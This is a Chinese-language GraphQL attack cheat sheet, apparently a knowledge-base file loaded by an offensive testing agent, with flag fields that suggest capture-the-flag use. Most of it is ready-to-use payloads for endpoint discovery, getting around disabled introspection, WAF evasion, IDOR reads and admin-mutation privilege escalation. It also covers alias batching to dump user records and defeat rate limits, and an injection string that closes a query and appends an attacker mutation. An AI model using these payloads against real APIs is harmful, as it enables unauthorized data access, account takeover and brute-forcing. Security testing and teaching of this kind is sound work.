# GraphQL 安全测试

> GraphQL API 攻击面: 端点发现/introspection 与绕过/隐藏参数/权限绕过/别名批量/查询拼接注入。
> 加载时机: 发现 /graphql 端点、POST JSON 查询、Playground/Explorer 页面、data/errors JSON 响应结构。

## §1 端点发现与 Introspection

**常见路径**: `/graphql`、`/api/graphql`、`/graphiql`、`/v1/graphql`、`/query`。
**确认**: `POST {"query":"{ __typename }"}` → `{"data":{"__typename":"Query"}}`。

**Introspection**（最重要信息源，含全部类型与字段）:
```json
{"query":"{ __schema { types { name fields { name type { name } } } } }"}
```
精简版（只看入口）:
```json
{"query":"{ __schema { queryType { fields { name args { name type { name } } } } mutationType { fields { name args { name type { name } } } } } }"}
```
单类型探测: `__type(name: "User")`。

数据枚举: 按 Schema 逐类型查（users/user(id)/posts），注意 **Schema 有但页面未展示的隐藏字段**——admin-only 字段暴露在类型定义中是高价值发现。
高价值方向: IDOR（`user(id: "victim")`）、batching、隐藏字段、嵌套对象字段鉴权弱于父对象（nested authz gaps）。

## §2 Introspection 禁用绕过五法

1. **Field Suggestion 枚举**: 引擎对拼错字段返回建议——`{"query":"{ __typena }"}` → `"Did you mean '__typename'?"`。发错误字段名从建议逐个枚举真实字段（可自动化）。
2. **GET 绕过**（WAF 只拦 POST 时）: `GET /graphql?query={__schema{types{name,fields{name}}}}`
3. **别名/Fragment**: `{"query":"{ a: __schema { types { name } } }"}` / `{"query":"fragment f on __Schema { types { name } } { __schema { ...f } }"}`
4. **大小写/空白**: `{"query":"{ __SCHEMA { types { name } } }"}` / `{"query":"\n{ __schema\n{ types\n{ name } } }"}`
5. **逐字段猜测**: `user`/`users`/`flag`/`admin{flag}`/`getUser(id:1)`

辅助: JS bundle/移动端包提取路由与查询；工具 Clairvoyance（字典重建 schema）、graphql-cop（自动探测）。

## §3 隐藏参数发现与权限绕过

**隐藏参数/字段**（REST 同用）:
- 管理文档有而公开文档没有的字段
- OpenAPI `additionalProperties` 或宽松 schema
- 前端代码请求体比 UI 控件丰富（读 JS bundle）
- 移动端端点携带 role/org/feature-flag/内部过滤字段

**权限绕过三式**:
1. 直接调管理 mutation: `{"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}`
2. 嵌套查询鉴权缺口: 关联对象字段鉴权弱于父对象——`user(id:1){flag}` 嵌套读到本不可见字段
3. 别名遍历 ID（批量拖库）: `{"query":"{ u1:user(id:1){id,name,flag} u2:user(id:2){id,name,flag} }"}`

## §4 别名批量绕速率限制

单请求别名重复同一 mutation（爆破/投票/认证接口绕频控）:
```graphql
mutation {
  a1: vote(id: "target") { ok }
  a2: vote(id: "target") { ok }   /* 重复 N 次——一个 HTTP 请求计一次 */
}
```
数组批量（服务端支持 batch）: `POST [{"query":"mutation{...}"}, {"query":"..."}]`。

**查询拼接注入**（服务端拼接查询文本时，区别于参数级注入）:
输入 `") { result } } mutation { adminAction(secret: true) { flag } } #` → 闭合原 query 追加攻击者 mutation。

WAF 绕过: URL 编码（`%7B` 即 `{`）+ 换行/空格变体。

## §5 SQL 注入视角（摘要）

GraphQL 参数流向 SQL 的注入面（batched 载体/where/orderBy/limit/search 参数/mutation 输入/sqlmap 打法）见 `$AGENT_DIR/knowledge-base/sqli-advanced.md`。

## §6 关联文件

- `$AGENT_DIR/knowledge-base/sqli-advanced.md` — SQL 注入专题
- `$AGENT_DIR/knowledge-base/web-methodology.md` — API 测试方法论
